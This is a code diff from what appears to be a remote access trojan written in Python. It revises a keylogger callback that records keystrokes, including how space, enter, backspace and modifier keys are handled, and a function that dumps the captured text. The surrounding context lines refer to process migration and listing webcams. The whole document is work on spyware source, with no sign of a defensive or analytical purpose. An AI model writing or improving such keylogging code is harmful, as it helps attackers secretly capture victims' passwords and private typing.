@@ -203,16 +203,16 @@ def migrate_to_process(target_pid):
     
 def keylogger_callback(event):
     global keylogger_data
-    # Special keys processing
-    if event.name == 'backspace':
-        if keylogger_data:
-            keylogger_data = keylogger_data[:-1]  # Remove the last character
+    if event.name == 'space':
+        keylogger_data.append(' ')  # Handle space key
     elif event.name == 'enter':
-        keylogger_data.append('\n')  # Add a new line for 'enter'
-    elif event.name == 'shift' or event.name == 'ctrl' or event.name == 'alt':
-        pass  # Ignore shift, ctrl, and alt keys
-    else:
-        keylogger_data.append(event.name)  # Append regular keys
+        keylogger_data.append('')  # Enter doesn't do anything in the string (we can skip it)
+    elif event.name == 'backspace':
+        if len(keylogger_data) > 0:
+            keylogger_data.pop()  # Remove the last character on backspace
+    elif event.name not in ['shift', 'ctrl', 'alt', 'tab', 'caps lock', 'esc']:
+        keylogger_data.append(event.name)  # Append other normal keys
+
 
 def start_keylogger():
     global keylogger_running
@@ -229,12 +229,11 @@ def stop_keylogger():
         print("Keylogger stopped.")
 
 
+
 def dump_keylogger_data():
     global keylogger_data
-    # Join all captured characters into a single string, ensuring no unnecessary line breaks
-    data = ''.join(keylogger_data)
-    keylogger_data = []  # Clear the data after dumping
-    return data
+    # Join the captured keylogger data into a single string and return it as one line
+    return ''.join(keylogger_data)
 
 # Function to list webcams
 def list_webcams():
